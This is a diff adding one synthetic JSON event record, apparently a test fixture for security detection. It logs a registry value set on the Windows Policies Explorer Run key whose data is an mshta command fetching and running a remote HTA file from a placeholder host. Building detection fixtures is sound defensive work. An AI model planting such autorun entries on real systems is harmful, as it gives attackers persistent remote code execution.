@@ -1,0 +1,1 @@
+{"schema_version":1,"synthetic":true,"event":{"ActionType":"RegistryValueSet","RegistryKey":"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run","RegistryValueName":"SyntheticPolicy","RegistryValueData":"mshta.exe https://example.invalid/synthetic.hta"}}
